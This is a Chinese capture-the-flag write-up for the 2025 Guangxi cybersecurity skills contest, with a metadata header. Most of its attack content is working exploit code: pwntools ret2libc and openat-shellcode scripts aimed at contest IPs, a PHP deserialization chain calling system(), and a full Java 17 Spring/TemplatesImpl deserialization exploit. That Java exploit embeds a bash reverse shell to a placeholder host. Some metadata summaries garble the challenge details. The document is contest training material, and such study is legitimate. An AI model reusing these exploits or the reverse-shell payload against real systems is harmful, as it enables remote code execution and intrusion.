---
title: 2025 年广西网络与信息安全职业技能竞赛 WriteUP
contest: 2025 广西网络与信息安全职业技能竞赛
year: 2025
difficulty: hard
vuln_type:
- stego_traffic
- reverse
- ret2libc
- rce
- deserialize
- web_unknown
tags:
- Wireshark
- 7-bit-decoder
- SpamMimic
- libc-2.35
- gets
- openat
- PHP-act动态函数
- Spring-aop
- JDK17
- POJONode
- TemplatesImpl
- JDK17反序列化
- 跨Module反射
attack_chain:
- 'Misc EasyShark: Wireshark 找 hint → 7-bit ASCII 解码 SpamMimic → flag'
- 'Crypto hint7-bit: 6664666C6E5F5F6C616974744067666868677B5F33677D59755F693072 (hex → spam)'
- 'Reverse sub_7FF603145E00: 提取函数 get2gets'
- 'PWN glibc2.35: cyclic(0x38) + gets + puts leak libc 0x28c0 → system + ''/bin/sh'' 字符串改造'
- 'PWN shellcode: openat(-100, ''flag'') + mmap(0x1337000) + writev 读 flag'
- 'Web easyphp: act() 动态调函数 + sha256 已知 → 文件名 + start_lineno + ''$'' + rtd_key_counter'
- 'ezphp: ?pw=1&act=%00util_handler_9x/var/www/html/index.php:18$0 → exit 链触发'
- 'popparser: PHP-Parser 反序列化触发 fOpYG::__destruct → 6 段 chain → system(''cat /fla?'')'
- 'Spring Java 17 反序列化: Spring AOP + TemplatesImpl + POJONode + EventListenerList + UndoManager + javassist'
key_payload: 'Spring AOP JDK17 反序列化: TemplatesImpl + POJONode + EventListenerList + UndoManager'
one_liner: 广西职业技能赛 8 大题：流量+密码+re+pwn+web+java
lesson: Java 17+ 反序列化要靠 Spring AOP 跨 Module 反射；PHP act() 链很新颖
quality: high
full_path: 2025年广西网络与信息安全职业技能竞赛WriteUP.full.md
meta_path: 2025年广西网络与信息安全职业技能竞赛WriteUP.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2025 年广西网络与信息安全职业技能竞赛 WriteUP。广西职业技能赛 8 大题：流量+密码+re+pwn+web+java。关键路径：Misc EasyShark: Wireshark 找 hint → 7-bit ASCII 解码 SpamMimic → flag → Crypto hint7-bit: 6664666C6E5F5F6C616974744067666868677B5F...'
category: misc
subcategory: stego
subcategories:
- stego
- reverse
- stack_overflow
- rce
- deserialization
- web_other
tools_used:
- Java
- PHP
- Spring
- Wireshark
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: industry
wp_url: https://www.ctfiot.com/281909.html
reasoning_chain:
- 触发点：EasyShark 给 pcap 抓包 → 假设：hint 隐藏在流量文本字段 → 动作：strings 提取 + 7-bit ASCII 解码
- 下一步：hex 6664666C6E... → SpamMimic 7-bit 解密 → 还原 flag
- 触发点：Reverse sub_7FF603145E00 → 假设：get2gets 函数实现 → 动作：IDA 静态分析还原算法
- 触发点：PWN glibc-2.35 gets 函数 → 假设：没 free_hook 走 gets 二次注入 → 动作：cyclic(0x38) + p64(gets) + p64(puts) + p64(start) 拼 payload1
- 观察：泄 libc + payload2 = b'/bin' + p8(u8(b"/")+1) + b'sh' 跳过 0x2f 字节 → 下一步：拼出 /bin/sh 的 system 输入
- 触发点：PWN shellcode openat(-100,'flag') → 假设：dirfd=-100 是 AT_FDCWD 走当前目录 → 动作：mmap(0x1337000, ...) + writev 输出 flag
- 触发点：Web easyphp act() 动态调函数 → 假设：act 参数可控制 → 动作：?pw=1&act=%00util_handler_9x/var/www/html/index.php:18$0
- 观察：trim 后 %00 + 路径 + 行号 + $0 触发内部 goto → 触发 util_handler_9x 直接 file_get_contents('/flag')
- 触发点：popparser PHP-Parser → 假设：6 段 chain 拼 → 动作：fOpYG→CtBCy→GdjSB→KrYNd→MmksV 序列化串成 system('cat /fla?')
- 触发点：Spring JDK 17 反序列化 → 假设：跨 Module 反射 → 动作：TemplatesImpl + POJONode + EventListenerList + UndoManager + javassist 拼 payload
- 下一步：跨 Module 反射通过 Unsafe.getAndSetObject 改 module 字段绕过模块隔离
failed_attempts:
- 试图套用 Struts2 OGNL payload → 失败：本题是 Spring，不是 Struts2 漏洞
- 试图用 free_hook 写 system → 失败：glibc 2.35 已移除 __free_hook
- 试图直接拼 payload bypass Trim → 失败：必须用 %00 在 trim 前 + 路径注入，单纯加 ; 被 trim 吃
key_observations:
- glibc 2.35 没有 __free_hook，pwn 走 gets 二次注入 + leak libc
- PHP act() 动态函数 + trim 处理 → %00 注入 + 文件路径 + 行号格式
- Java 17+ 模块化 + 反序列化要靠 Spring AOP 跨 Module 反射
- SpamMimic 7-bit 解密是经典 stego 工具
- PHP-Parser 漏洞链 6 个 gadget 入口 fOpYG::__destruct 触发 exit()
prerequisites:
- glibc 2.35 pwn（gets + puts leak + system 调用）
- PHP 动态函数 + trim 特性 + %00 注入
- Java 反序列化链 + JDK 17 模块化
- SpamMimic / 7-bit-decoder 工具
---
# 2025年广西网络与信息安全职业技能竞赛WriteUP

> 原文: https://www.ctfiot.com/281909.html
> ID: 281909

❝

由于传播、利用本公众号”隼目安全”所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责,公众号”隼目安全”及作者不为此承担任何责任,一旦造成后果请自行承担!如有侵权烦请告知,我们会立即删除并致歉谢谢！

【Misc】

签到

EasyShark

提取zip

根据hint爆破六位数密码

【crypto】

前方迷雾重重

hint7-bit语境 ASCII/SpamMimic内部编码为7-bit风格的位流，典型的SpamMimic

decode得到

6664666C6E5F5F6C616974744067666868677B5F33677D59755F693072

随波逐流一下

【reverse】

bit

xor，没什么好说的，sub_7FF603145E00()函数丢ai直接出flag

【pwn】

name

先看主函数

跟进say

say函数存在栈溢出

这道题可以打get2gets，通过调试计算出glibc 2.35的 tls结构体静态偏移，得到0x28c0

from pwn import *context(arch='amd64',os='linux')context.terminal = ['tmux','splitw','-h']#sh= process("./pwn")sh = remote('103.213.97.75',53922)elf = ELF("./pwn")libc = ELF("./libc.so.6")start = 0x401090#gdb.attach(sh, "b *0x4011E2nc")payload = b'/bin/sh'payload = payload.rjust(0x2F, b'A')sh.sendafter('what's your name', payload)sh_addr = 0x4040c8sh.sendafter('choice:', str(1))success(hex(libc.sym['puts']))payload1= cyclic(0x38) + p64(elf.sym['gets']) + p64(elf.sym['puts']) + p64(start)sh.sendlineafter('say something:',payload1)payload2=b'AAAA'+b'x00'*3sleep(10)sh.sendline(payload2)sh.recvuntil(b'xffxffxffxff')leak=u64(sh.recv(6).ljust(8,b'x00'))libc_base=leak + 0x28c0#info('libc_base:'+hex(libc_base))success(hex(libc_base))libc.address = libc_basesuccess(hex(libc.symbols['system']))sh.sendafter('what's your name', payload)sh.sendafter('choice:', str(1))payload1= cyclic(0x38) + p64(elf.sym['gets']) + p64(libc.sym['system']) + p64(start)sh.sendlineafter('say something:',payload1)payload2=b'/bin'+p8(u8(b"/")+1)+b'sh'sleep(10)sh.sendline(payload2)sh.interactive()

shellcode

用户可以直接输入shellcode

这题ban了orw，常规的orw不行，得用openat

from pwn import *context(arch='amd64',os='linux')context.log_level="debug"context.terminal = ["tmux","splitw","-h"]#io=process("./vuln")io=remote("103.213.97.75", 53423)r = lambda a : io.recv(a)rl = lambda a=False : io.recvline(a)ru = lambda a,b=True : io.recvuntil(a,b)s = lambda x : io.send(x)sl = lambda x : io.sendline(x)sa = lambda a,b : io.sendafter(a,b)sla = lambda a,b : io.sendlineafter(a,b)shell = lambda : io.interactive()def debug(script=""): gdb.attach(io, gdbscript=script)flag_dir="flag"sc=asm(shellcraft.openat(-100, flag_dir))sc+=asm("""mov rdi, 0x1337000mov rsi, 0x1000mov rdx, 1mov r10, 1mov r8, raxxor r9, r9mov rax, 0x9syscall#mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);mov rbx, 0x100push rbxpush raxmov rdi, 1lea rsi, [rsp]mov r10, -1mov r8, 0mov r9, 0mov rax, 0x14syscall""")s(sc)shell()

【web】

easyphp

<?phpfunctionviewsource() { show_source(__FILE__); }$act= trim($_REQUEST['act'] ??'viewsource');$pw = trim($_REQUEST['pw'] ??'');if(false) { return0;}if(0 == 1) { echo"hello world";}if(strcmp(hash('sha256',$pw),'aac3f8e8d1e57ad313282fbf99804cf03d581c5292474ee57e2d0bc8d5570670') === 0) { functionutil_handler_9x() { echofile_get_contents('/flag'); }}if(false) { functiongamma_c3() {}}if(time() < 0) { functiondelta_d4() {}}$act();

一眼原题，分析文章

知识星球2023年10月PHP函数小挑战 | 离别歌（https://www.leavesongs.com/PENETRATION/php-challenge-2023-oct.html）

具体分析过程不再赘述，内容与强网杯ezphp类似，重点内容主要是

在PHP内核编译PHP源码进行“函数定义”操作时，会判断函数是否为全局函数，如果是全局函数，则直接将函数自己本身的函数名添加到函数表中，如果不是全局函数，则会通过一定规则生成函数名并加入函数表，而这个规则就是' ' + name + filename + ':' + start_lineno + '$' + rtd_key_counter。

•	name：函数名

•	filename：PHP文件绝对路径

•	start_lineno：函数起始定义行号（以1为第一行）

•	rtd_key_counter：一个全局访问计数，每次执行会自增1，从0开始

前三个都是已知的，第四个是一个全局访问计数，每次执行文件就会自增1，从0开始。

所以在一个全新的环境中，util_handler_9x函数的名称是%00util_handler_9x/var/www/html/index.php:18$0

trim会去除掉字符串首尾的空白字符（<space>nrtv ），如果直接传参act为%00util_handler_9x/var/www/html/index.php:18$0，则前面的%00会被去除，需要在%00前加一个绕过trim的过滤，会被解析为根命名空间，然后被去除，不影响函数的调用。

所以payload为：?pw=1&act=%00util_handler_9x/var/www/html/index.php:18$0 pw=1&act=%00util_handler_9x/var/www/html/index.php:18$0

敲赛博木鱼会梦见电子佛祖吗

路由与逻辑

GET /：渲染 index.html，显示 merit 和条件性 flag

GET /reset：把全局功德 Merit 重置为 0

POST /upgrade：根据 name 和 quantity 调整 Merit 阈值与 flag

服务端在merit > 1000000000时读取 /flag 并传入模板

模板中{{ if .merit }}仅检查非零，实际 flag 是否显示取决于服务端是否设置

核心问题：int32 溢出（乘法）+ 非预期的符号逻辑cost、quantity、merit全部是 int32。

在"Spend"或"Give"时，cost *= info.Quantity可能发生 int32 溢出。

溢出导致 cost 变为一个巨大负数，随后执行Merit.Set(merit - cost)，等价于给 merit 加上一个巨大正数。

余额校验if merit < cost在 cost 为负数时几乎总是通过（因为初始 merit >= 0）。

把 merit推到远超 1e9，从而在 / 渲染时读出 /flag 并显示

直接在/upgrade传入name=Spend&quantity=214748365访问首页即可获取flag

popparser

<?phprequire'vendor/autoload.php';highlight_file(__FILE__);use PhpParserError;use PhpParserNodeDumper;use PhpParserParserFactory;include'./class.php';$code=file_get_contents('./class.php');if(isset($_GET['code'])and$_GET['code']=="show"){ $parser= (new ParserFactory())->createForNewestSupportedVersion(); try { $stmts=$parser->parse($code); $dumper= new NodeDumper; echo""; echo$dumper->dump($stmts); echo""; } catch (Error$e) { echo"Parse error: {$e->getMessage()}n"; }}if(isset($_POST['fast'])){ $a= @unserialize($_POST['fast']); throw new Exception("Nope");}

vendor/autoload.php是 PHP Composer 项目中自动生成的自动加载文件，在这里主要是为了引入AST解析的相关库，如果$_GET['code']为show的话，会输出class.php的AST

拿着AST将其还原为源码，得到

<?php
class fOpYG { public$fKZXU; publicfunction__destruct() { exit($this->fKZXU); }}class KrYNd { public$DEzzO; publicfunction__invoke() { $this->DEzzO->TGHZJ(); } publicfunctionTGHZJ() { phpinfo(); }}class GdjSB { public$lLgKS; publicfunction__get($WPnpN) { ($this->lLgKS)(); }}class MmksV { public$pABqA; public$iEClU; publicfunctionTGHZJ() { if(!preg_match("/flag/i",$this->iEClU)) { // 这个位置还原出来的是$this->pABqA($this->iEClU);，但是经测试，应该是下面这种情况 ($this->pABqA)($this->iEClU); }else{ echo"bqhJxRfXVNurBKwvhS"; } }}class CtBCy { public$tvlgs; publicfunction__toString() { $oKNzo=$this->tvlgs->nwOds; return"kmMQXWkOsxPCnMuck"; }}class wLJXF { publicfunctionTGHZJ() { echo"OQQZflbwMXgoJIWeIt"; }}

很干燥的反序列化，链子为

<?php
class fOpYG { public$fKZXU;}class KrYNd { public$DEzzO; publicfunction__invoke() { $this->DEzzO->TGHZJ(); } publicfunctionTGHZJ() { phpinfo(); }}class GdjSB { public$lLgKS; publicfunction__get($WPnpN) { ($this->lLgKS)(); }}class MmksV { public$pABqA; public$iEClU; publicfunctionTGHZJ() { if(!preg_match("/flag/i",$this->iEClU)) { $this->pABqA($this->iEClU); }else{ echo"bqhJxRfXVNurBKwvhS"; } }}class CtBCy { public$tvlgs; publicfunction__toString() { $oKNzo=$this->tvlgs->nwOds; return"kmMQXWkOsxPCnMuck"; }}class wLJXF { publicfunctionTGHZJ() { echo"OQQZflbwMXgoJIWeIt"; }}$a= new fOpYG;$a->fKZXU=new CtBCy;$a->fKZXU->tvlgs=new GdjSB;$a->fKZXU->tvlgs->lLgKS=new KrYNd;$a->fKZXU->tvlgs->lLgKS->DEzzO = new MmksV;$a->fKZXU->tvlgs->lLgKS->DEzzO->pABqA="system";$a->fKZXU->tvlgs->lLgKS->DEzzO->iEClU="cat /fla?";echoserialize($a);//生成后的payload需要删掉最后一个花括号

反序列化后面还有一个throw new Exception("Nope");，因为PHP的GC垃圾回收机制，如果你传入正常的反序列化链子，是不会触发fOpYG::
__destruct()的，因为程序最后抛出了一个错误导致无法触发__destruct()，所以在链子传入的时候，要在不破坏链子整体数据的情况下破坏链子的结构，导致反序列化unserialize报错从而提前进行垃圾回收，简单来说就是删掉最后一个花括号。

Spring

反编译jar包，只有一个很干燥的反序列化接口

看pom.xml，得知是java17，只有spring相关依赖，联想到高版本情况下的spring原生链。直接参考

高版本JDK下的Spring原生反序列化链 – fushulingのblog（https://fushuling.com/index.php/2025/08/21/%E9%AB%98%E7%89%88%E6%9C%ACjdk%E4%B8%8B%E7%9A%84spring%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/）

payload

package com.example;
import javax.swing.event.EventListenerList;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import javax.swing.undo.UndoManager;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Vector;
import java.util.ArrayList;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import sun.misc.Unsafe;
import java.lang.reflect.Method;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import javax.xml.transform.Templates;
import java.lang.reflect.*;// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMEDpublic class Main { public static void main(String[] args) throws Exception{ // 删除writeReplace保证正常反序列化 try { ClassPool pool = ClassPool.getDefault(); CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace"); jsonNode.removeMethod(writeReplace); ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); jsonNode.toClass(classLoader, null); } catch (Exception e) { } // 把模块强行修改，切换成和目标类一样的 Module 对象 ArrayList<Class> classes = new ArrayList<>(); classes.add(TemplatesImpl.class); classes.add(POJONode.class); classes.add(EventListenerList.class); classes.add(Main.class); classes.add(Field.class); classes.add(Method.class); new Main().bypassModule(classes); // ===== EXP 构造 ===== byte[] code1 = getTemplateCode(); byte[] code2 = ClassPool.getDefault().makeClass("fushuling").toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,"_name","xxx"); setFieldValue(templates,"_bytecodes", new byte[][]{code1, code2}); setFieldValue(templates,"_transletIndex",0); POJONode node = new POJONode(makeTemplatesImplAopProxy(templates)); EventListenerList eventListenerList = getEventListenerList(node); serialize(eventListenerList,true); } public static byte[] serialize(Object obj, boolean flag) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(obj); oos.close(); if(flag) System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(baos.toByteArray()), StandardCharsets.UTF_8)); returnbaos.toByteArray(); } public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler); returnproxy; } public static byte[] getTemplateCode() throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass template = pool.makeClass("MyTemplate"); String block ="Runtime.getRuntime().exec("bash -c$@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx/xxxx 0>&1");"; template.makeClassInitializer().insertBefore(block); returntemplate.toBytecode(); } public static EventListenerList getEventListenerList(Object obj) throws Exception{ EventListenerList list = new EventListenerList(); UndoManager undomanager = new UndoManager(); //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。 Vector vector = (Vector) getFieldValue(undomanager,"edits"); vector.add(obj); setFieldValue(list,"listenerList", new Object[]{Class.class, undomanager}); returnlist; } private static Method getMethod(Class clazz, String methodName, Class[] params) { Method method = null; while(clazz!=null){ try { method = clazz.getDeclaredMethod(methodName,params); break; }catch (NoSuchMethodException e){ clazz = clazz.getSuperclass(); } } returnmethod; } private static UnsafegetUnsafe() { Unsafe unsafe = null; try { Field field = Unsafe.class.getDeclaredField("theUnsafe"); field.setAccessible(true); unsafe = (Unsafe) field.get(null); } catch (Exception e) { throw new AssertionError(e); } returnunsafe; } public void bypassModule(ArrayList<Class> classes){ try { Unsafe unsafe = getUnsafe(); Class currentClass = this.getClass(); try { Method getModuleMethod = getMethod(Class.class,"getModule", new Class[0]); if(getModuleMethod != null) { for(Class aClass : classes) { Object targetModule = getModuleMethod.invoke(aClass, new Object[]{}); unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule); } } }catch (Exception e) { } }catch (Exception e){ e.printStackTrace(); } } public static Object getFieldValue(Object obj, String fieldName) throws Exception { Field field = null; Class c = obj.getClass(); for(int i = 0; i < 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e) { c = c.getSuperclass(); } } field.setAccessible(true); returnfield.get(obj); } public static void setFieldValue(Object obj, String field, Object val) throws Exception { Field dField = obj.getClass().getDeclaredField(field); dField.setAccessible(true); dField.set(obj, val); }}

测试环境出网，直接弹shell即可

往期推荐

Z0Scan设计与实现：通用插件与分布式扫描新思路

【相关分享】记一次edu小程序全站用户接管与多处越权

记一次edu的轻松Getshell

【相关分享】记一次edu的SQL注入

【相关分享】无问社区安全AI积分赠送

文稿 |Ph@nt0m

制作 | Xuan8a1

审发 | 隼目安全


```
6664666C6E5F5F6C616974744067666868677B5F33677D59755F693072
from pwn import *context(arch='amd64',os='linux')context.terminal = ['tmux','splitw','-h']#sh= process("./pwn")sh = remote('103.213.97.75',53922)elf = ELF("./pwn")libc = ELF("./libc.so.6")start = 0x401090#gdb.attach(sh, "b *0x4011E2nc")payload = b'/bin/sh'payload = payload.rjust(0x2F, b'A')sh.sendafter('what's your name', payload)sh_addr = 0x4040c8sh.sendafter('choice:', str(1))success(hex(libc.sym['puts']))payload1= cyclic(0x38) + p64(elf.sym['gets']) + p64(elf.sym['puts']) + p64(start)sh.sendlineafter('say something:',payload1)payload2=b'AAAA'+b'x00'*3sleep(10)sh.sendline(payload2)sh.recvuntil(b'xffxffxffxff')leak=u64(sh.recv(6).ljust(8,b'x00'))libc_base=leak + 0x28c0#info('libc_base:'+hex(libc_base))success(hex(libc_base))libc.address = libc_basesuccess(hex(libc.symbols['system']))sh.sendafter('what's your name', payload)sh.sendafter('choice:', str(1))payload1= cyclic(0x38) + p64(elf.sym['gets']) + p64(libc.sym['system']) + p64(start)sh.sendlineafter('say something:',payload1)payload2=b'/bin'+p8(u8(b"/")+1)+b'sh'sleep(10)sh.sendline(payload2)sh.interactive()
from pwn import *context(arch='amd64',os='linux')context.log_level="debug"context.terminal = ["tmux","splitw","-h"]#io=process("./vuln")io=remote("103.213.97.75", 53423)r = lambda a : io.recv(a)rl = lambda a=False : io.recvline(a)ru = lambda a,b=True : io.recvuntil(a,b)s = lambda x : io.send(x)sl = lambda x : io.sendline(x)sa = lambda a,b : io.sendafter(a,b)sla = lambda a,b : io.sendlineafter(a,b)shell = lambda : io.interactive()def debug(script=""): gdb.attach(io, gdbscript=script)flag_dir="flag"sc=asm(shellcraft.openat(-100, flag_dir))sc+=asm("""mov rdi, 0x1337000mov rsi, 0x1000mov rdx, 1mov r10, 1mov r8, raxxor r9, r9mov rax, 0x9syscall#mmap(0x1337000, 0x100, PROT_READ | PROT_WRITE, rax, 1);mov rbx, 0x100push rbxpush raxmov rdi, 1lea rsi, [rsp]mov r10, -1mov r8, 0mov r9, 0mov rax, 0x14syscall""")s(sc)shell()
<?phpfunctionviewsource() { show_source(__FILE__); }$act= trim($_REQUEST['act'] ??'viewsource');$pw = trim($_REQUEST['pw'] ??'');if(false) { return0;}if(0 == 1) { echo"hello world";}if(strcmp(hash('sha256',$pw),'aac3f8e8d1e57ad313282fbf99804cf03d581c5292474ee57e2d0bc8d5570670') === 0) { functionutil_handler_9x() { echofile_get_contents('/flag'); }}if(false) { functiongamma_c3() {}}if(time() < 0) { functiondelta_d4() {}}$act();
<?phprequire'vendor/autoload.php';highlight_file(__FILE__);use PhpParserError;use PhpParserNodeDumper;use PhpParserParserFactory;include'./class.php';$code=file_get_contents('./class.php');if(isset($_GET['code'])and$_GET['code']=="show"){ $parser= (new ParserFactory())->createForNewestSupportedVersion(); try { $stmts=$parser->parse($code); $dumper= new NodeDumper; echo""; echo$dumper->dump($stmts); echo""; } catch (Error$e) { echo"Parse error: {$e->getMessage()}n"; }}if(isset($_POST['fast'])){ $a= @unserialize($_POST['fast']); throw new Exception("Nope");}
<?php
class fOpYG { public$fKZXU; publicfunction__destruct() { exit($this->fKZXU); }}class KrYNd { public$DEzzO; publicfunction__invoke() { $this->DEzzO->TGHZJ(); } publicfunctionTGHZJ() { phpinfo(); }}class GdjSB { public$lLgKS; publicfunction__get($WPnpN) { ($this->lLgKS)(); }}class MmksV { public$pABqA; public$iEClU; publicfunctionTGHZJ() { if(!preg_match("/flag/i",$this->iEClU)) { // 这个位置还原出来的是$this->pABqA($this->iEClU);，但是经测试，应该是下面这种情况 ($this->pABqA)($this->iEClU); }else{ echo"bqhJxRfXVNurBKwvhS"; } }}class CtBCy { public$tvlgs; publicfunction__toString() { $oKNzo=$this->tvlgs->nwOds; return"kmMQXWkOsxPCnMuck"; }}class wLJXF { publicfunctionTGHZJ() { echo"OQQZflbwMXgoJIWeIt"; }}
<?php
class fOpYG { public$fKZXU;}class KrYNd { public$DEzzO; publicfunction__invoke() { $this->DEzzO->TGHZJ(); } publicfunctionTGHZJ() { phpinfo(); }}class GdjSB { public$lLgKS; publicfunction__get($WPnpN) { ($this->lLgKS)(); }}class MmksV { public$pABqA; public$iEClU; publicfunctionTGHZJ() { if(!preg_match("/flag/i",$this->iEClU)) { $this->pABqA($this->iEClU); }else{ echo"bqhJxRfXVNurBKwvhS"; } }}class CtBCy { public$tvlgs; publicfunction__toString() { $oKNzo=$this->tvlgs->nwOds; return"kmMQXWkOsxPCnMuck"; }}class wLJXF { publicfunctionTGHZJ() { echo"OQQZflbwMXgoJIWeIt"; }}$a= new fOpYG;$a->fKZXU=new CtBCy;$a->fKZXU->tvlgs=new GdjSB;$a->fKZXU->tvlgs->lLgKS=new KrYNd;$a->fKZXU->tvlgs->lLgKS->DEzzO = new MmksV;$a->fKZXU->tvlgs->lLgKS->DEzzO->pABqA="system";$a->fKZXU->tvlgs->lLgKS->DEzzO->iEClU="cat /fla?";echoserialize($a);//生成后的payload需要删掉最后一个花括号
package com.example;
import javax.swing.event.EventListenerList;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import javax.swing.undo.UndoManager;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Vector;
import java.util.ArrayList;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import sun.misc.Unsafe;
import java.lang.reflect.Method;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;
import javax.xml.transform.Templates;
import java.lang.reflect.*;// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMEDpublic class Main { public static void main(String[] args) throws Exception{ // 删除writeReplace保证正常反序列化 try { ClassPool pool = ClassPool.getDefault(); CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode"); CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace"); jsonNode.removeMethod(writeReplace); ClassLoader classLoader = Thread.currentThread().getContextClassLoader(); jsonNode.toClass(classLoader, null); } catch (Exception e) { } // 把模块强行修改，切换成和目标类一样的 Module 对象 ArrayList<Class> classes = new ArrayList<>(); classes.add(TemplatesImpl.class); classes.add(POJONode.class); classes.add(EventListenerList.class); classes.add(Main.class); classes.add(Field.class); classes.add(Method.class); new Main().bypassModule(classes); // ===== EXP 构造 ===== byte[] code1 = getTemplateCode(); byte[] code2 = ClassPool.getDefault().makeClass("fushuling").toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,"_name","xxx"); setFieldValue(templates,"_bytecodes", new byte[][]{code1, code2}); setFieldValue(templates,"_transletIndex",0); POJONode node = new POJONode(makeTemplatesImplAopProxy(templates)); EventListenerList eventListenerList = getEventListenerList(node); serialize(eventListenerList,true); } public static byte[] serialize(Object obj, boolean flag) throws Exception { ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(obj); oos.close(); if(flag) System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(baos.toByteArray()), StandardCharsets.UTF_8)); returnbaos.toByteArray(); } public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler); returnproxy; } public static byte[] getTemplateCode() throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass template = pool.makeClass("MyTemplate"); String block ="Runtime.getRuntime().exec("bash -c$@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx/xxxx 0>&1");"; template.makeClassInitializer().insertBefore(block); returntemplate.toBytecode(); } public static EventListenerList getEventListenerList(Object obj) throws Exception{ EventListenerList list = new EventListenerList(); UndoManager undomanager = new UndoManager(); //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。 Vector vector = (Vector) getFieldValue(undomanager,"edits"); vector.add(obj); setFieldValue(list,"listenerList", new Object[]{Class.class, undomanager}); returnlist; } private static Method getMethod(Class clazz, String methodName, Class[] params) { Method method = null; while(clazz!=null){ try { method = clazz.getDeclaredMethod(methodName,params); break; }catch (NoSuchMethodException e){ clazz = clazz.getSuperclass(); } } returnmethod; } private static UnsafegetUnsafe() { Unsafe unsafe = null; try { Field field = Unsafe.class.getDeclaredField("theUnsafe"); field.setAccessible(true); unsafe = (Unsafe) field.get(null); } catch (Exception e) { throw new AssertionError(e); } returnunsafe; } public void bypassModule(ArrayList<Class> classes){ try { Unsafe unsafe = getUnsafe(); Class currentClass = this.getClass(); try { Method getModuleMethod = getMethod(Class.class,"getModule", new Class[0]); if(getModuleMethod != null) { for(Class aClass : classes) { Object targetModule = getModuleMethod.invoke(aClass, new Object[]{}); unsafe.getAndSetObject(currentClass, unsafe.objectFieldOffset(Class.class.getDeclaredField("module")), targetModule); } } }catch (Exception e) { } }catch (Exception e){ e.printStackTrace(); } } public static Object getFieldValue(Object obj, String fieldName) throws Exception { Field field = null; Class c = obj.getClass(); for(int i = 0; i < 5; i++) { try { field = c.getDeclaredField(fieldName); } catch (NoSuchFieldException e) { c = c.getSuperclass(); } } field.setAccessible(true); returnfield.get(obj); } public static void setFieldValue(Object obj, String field, Object val) throws Exception { Field dField = obj.getClass().getDeclaredField(field); dField.setAccessible(true); dField.set(obj, val); }}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]